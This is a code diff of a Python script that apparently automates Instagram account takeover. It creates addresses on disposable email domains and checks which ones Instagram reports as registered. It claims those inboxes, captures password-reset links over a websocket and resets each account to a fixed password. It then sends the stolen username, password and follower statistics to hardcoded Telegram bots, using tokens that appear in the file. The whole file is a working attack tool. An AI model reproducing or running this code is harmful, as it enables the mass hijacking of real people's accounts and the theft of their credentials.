@@ -6,32 +6,22 @@ import os
 import threading
 import random
 from time import sleep
-import httpx
-import uuid
-import user_agent
+import httpx, uuid, time, random, string, uuid, user_agent
 import websocket
 import json
 import datetime
 import sys
-from concurrent.futures import ThreadPoolExecutor
-
-# ========== المتغيرات العامة ==========
-bi, hit, be, dead, gi, don = 0, 0, 0, 0, 0, 0
-donr = 0
-doner = 0
-gm = 0
+from asmix import Instagram
+bi, hit, be, dead, gi ,don= 0, 0, 0, 0, 0, 0
+donr=0
 J = '\x1b[2;36m'
 N = '\x1b[1;37m'
-
-# ========== إعدادات البوت ==========
 print("هون انتبه حط توكن و ايدي معلومات الحساب")
 doner=0
 token2 = "8050806901:AAEhkrFv_0mN6rPgHqnLa9rIc1nu_s0R9xc"
 chid2 = "6504571995"
 token = "8762294860:AAFXbNqje6dZfqbIsbL2BJo_gYwigokBqbw"
 chid = "8776149021"
-
-# ========== دوال استخراج معلومات الحساب من 11.py ==========
 def get_instagram_info_api(username):
     url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
     
@@ -108,11 +98,11 @@ def get_account_creation_date(username):
         
         variables = {
             "id": user_id,
-            "first": 50
+            "first": 50  
         }
         
         params = {
-            "query_hash": "e769aa130647d2354c40ea6a439bfc08",
+            "query_hash": "e769aa130647d2354c40ea6a439bfc08",  
             "variables": json.dumps(variables)
         }
         
@@ -292,26 +282,16 @@ def get_user_info_from_instagram(username):
     except Exception as e:
         return 0, 0, '', False, False, 0
 
-# ========== دالة عرض اللوكن (البانر) ==========
+
+
 def banner():
     try:
         from cfonts import render
-        logo = render('dark', colors=['red', 'white'], align='center', font='block')
-        print(logo)
-        print("\033[1;36m" + "="*60 + "\033[0m")
-        print("\033[1;33m" + "    Instagram Account Reset Tool" + "\033[0m")
-        print("\033[1;36m" + "="*60 + "\033[0m\n")
+        WDEH = render('{END}', colors=['red', 'white'], align='center')
     except ImportError:
-        print("""
-\033[1;31m
-    husen
-\033[0m
-\033[1;36m============================================================\033[0m
-\033[1;33m    Instagram Account Reset Tool\033[0m
-\033[1;36m============================================================\033[0m
-        """)
+        pass
+    print(WDEH)
 
-# ========== دوال الهوية والجهاز ==========
 def generate_device_info():
     devices = [
         {'android': '31/12', 'dpi': '480dpi', 'res': '1080x2400', 'brand': 'samsung', 'model': 'SM-G998B', 'cpu': 'qcom'},
@@ -409,7 +389,6 @@ def generate_user_agent():
     
     return f'Instagram 398.0.0.45.77 Android ({android_sdk}/{android_ver}; {dpi}dpi; {resolution}; {manufacturer}; {model}; {codename}; {chipset}; {locale}; {build_number})'
 
-# ========== دالة إعادة تعيين كلمة المرور ==========
 def reset_instagram_password(reset_link):
     try:
         ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD, device_info = generate_device_info()
@@ -522,7 +501,6 @@ def reset_instagram_password(reset_link):
     except Exception as e:
         return {'success': False, 'error': str(e)}
 
-# ========== دالة إرسال الإيميل ==========
 def send(eml):
     global don
     session = requests.Session()
@@ -540,17 +518,17 @@ def send(eml):
         'x-bloks-is-layout-rtl': 'false',
         'x-bloks-version-id': 'b86f6fc6f8131e7f0d789ecd251bbf01896d7d103e6345b34d3e806663c0ff8b',
         'x-fb-friendly-name': 'IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/',
-        'x-ig-android-id': android_id,
+        'x-ig-android-id': android_id, 
         'x-ig-app-id': '567067343352427',
         'x-ig-app-locale': 'en_US',
         'x-ig-capabilities': '3brTv10=',
         'x-ig-connection-type': 'WIFI',
-        'x-ig-device-id': device_id,
+        'x-ig-device-id': device_id,  
         'x-ig-device-locale': 'ar_LY',
-        'x-ig-family-device-id': family_device_id,
+        'x-ig-family-device-id': family_device_id,  
         'x-ig-timezone-offset': '10800',
         'x-ig-www-claim': '0',
-        'x-mid': mid,
+        'x-mid': mid,  
         'Connection': 'close',
     }
     
@@ -561,13 +539,12 @@ def send(eml):
         'bk_client_context': '{"bloks_version":"b86f6fc6f8131e7f0d789ecd251bbf01896d7d103e6345b34d3e806663c0ff8b","styles_id":"instagram"}',
         'bloks_versioning_id': 'b86f6fc6f8131e7f0d789ecd251bbf01896d7d103e6345b34d3e806663c0ff8b',
     }
-    
     try:
         response = session.post(
             'https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/',
             headers=headers,
             data=data,
-            stream=True
+            stream=True      
         ).text
         print('')
         hidden_email = None
@@ -579,17 +556,18 @@ def send(eml):
         
         if f"We sent a link to {eml}" in response:
             don += 1
+        elif 'Please try again.' in response and 'Sorry, something went wrong' in response:
+            print('turn on vpn :')
         else:
-            pass
+            print('ops')
         
-        return success, hidden_email, eml
+        return success, hidden_email, eml  
         
     except Exception as e:
         print(e)
 
-# ========== دالة getu (الاتصال بـ websocket) ==========
 def getu(eml, hash_val, ex):
-    global donr, dead
+    global donr,dead
     ws = websocket.WebSocket()
     ws.connect("wss://ws.checker.in:8443", header=[
         "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
@@ -600,7 +578,7 @@ def getu(eml, hash_val, ex):
     ws.send(f"{ex}-{eml}-{hash_val}")
     ws.send("ping")
     
-    i = 0
+    i=0
     reset_link = None
     username = None
     send(eml)
@@ -637,7 +615,7 @@ def getu(eml, hash_val, ex):
                             result = reset_instagram_password(reset_link)
                             donr += 1
                             
-                            # جلب معلومات الحساب الإضافية
+                            
                             print(f"[+] Fetching account info for: {username}")
                             followers_count, following_count, full_name, is_private, is_verified, posts_count, account_year, additional_info = get_followers_following(username)
                             
@@ -646,11 +624,10 @@ def getu(eml, hash_val, ex):
                             
                             ff = f'''
 ✅ Instagram Account Reset Complete!
-******
+
 Email : {eml}
 Username : {username}
 New Password : dark1234
-******
  Account Statistics:
 Full Name: {full_name}
 Followers: {followers_count:,}
@@ -658,10 +635,9 @@ Following: {following_count:,}
 Posts: {posts_count}
 Account Year: {account_year}
 Status: {private_status} | {verified_status}
-******
+════════════════════════════════
  Profile: instagram.com/{username}
-******
-By eng : @eo_xr
+By eng :@eo_xr
 '''
                             
                             message = ff
@@ -701,8 +677,9 @@ By eng : @eo_xr
     ws.close()
     return None, None
 
-# ========== دالة التحقق من الإيميل ==========
-def check_email(email):
+gm=0
+
+def check_email(email): 
     global bi, hit, be, gm
     siteKey = '6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct'
     siteUrl = 'https://hi2.in/'
@@ -798,26 +775,31 @@ def check_email(email):
     rss = requests.post('https://hi2.in/api/custom', headers=headers2, data=data, **request_kwargs)
     rs = rss.json()
     print(rs)
-    
     if "hash" in rss.text:
         eml = rs.get('email')
         hash_val = rs.get('hash')
         ex = rs.get('expiry')
         
-        # استدعاء getu مع المعاملات الثلاثة
+        
         getu(eml, hash_val, ex)
         
-        with open('/storage/emulated/0/Download/etc.txt', 'a', encoding='utf-8') as f:
-            f.write(f"{eml}\n")
+        
         
         print(f"\n Good Email -: {eml}")
         
         gm += 1
+          
         
     else:
         be += 1
 
-# ========== دالة التحقق من الإيميل في إنستغرام ==========
+print('''
+1 - hi2.in
+2- telemail.com
+3 - random
+''')
+cl=3
+
 def em(email):
     global bi, hit, be, dead, gi, donr, don, gm
     
@@ -833,7 +815,7 @@ def em(email):
             ).json()
         
         if res.get('error_type') == 'email_is_taken':
-            check_email(email)
+            check_email(email)  
             gi += 1
             
         else:
@@ -844,42 +826,26 @@ def em(email):
     except Exception as e:
         print(f"خطأ: {e}")
 
-# ========== دالة توليد الإيميلات ==========
 def qq():
-    cl = 3  # تم تعيين القيمة الافتراضية 1
-    ema = random.choice(['hi2.in', 'telegmail.com'])
+    ema=random.choice(['hi2.in','telegmail.com'])
     letters = "abcdefghijklmnopqrstwvwxyzuxyz"
-    cil = "".join(random.choice(letters) for _ in range(6))
-    
-    if cl == 1:
-        email = cil + '@hi2.in'
-    elif cl == 2:
-        email = cil + '@telegmail.com'
-    elif cl == 3:
-        email = cil + '@' + ema
-    else:
-        email = cil + '@hi2.in'  # قيمة افتراضية
-    
+    ail ="".join(random.choice(letters) for _ in range(1))
+    cil="".join(random.choice(letters) for _ in range(6))
+    if cl==1:
+        email=cil+'@' + 'hi2.in'
+    elif cl==2:
+        email=cil+'@'+'telegmail.com'
+    elif cl==3:
+        email=cil+'@'+ema
     em(email)
 
-# ========== دالة العامل (Worker) ==========
 def worker():
     while True:
         qq()
 
-# ========== بدء التنفيذ ==========
-if __name__ == "__main__":
-    banner()
-    
-    print('''
-    1 - hi2.in
-    2 - telegmail.com
-    3 - random
-    ''')
-    
-    # استخدام ThreadPoolExecutor لتشغيل العمال
-    threads_count = 30
-    
-    with ThreadPoolExecutor(max_workers=threads_count) as executor:
-        for _ in range(threads_count):
-            executor.submit(worker)
+from concurrent.futures import ThreadPoolExecutor
+threads_count = 30
+
+with ThreadPoolExecutor(max_workers=threads_count) as executor:
+    for _ in range(threads_count):
+        executor.submit(worker)
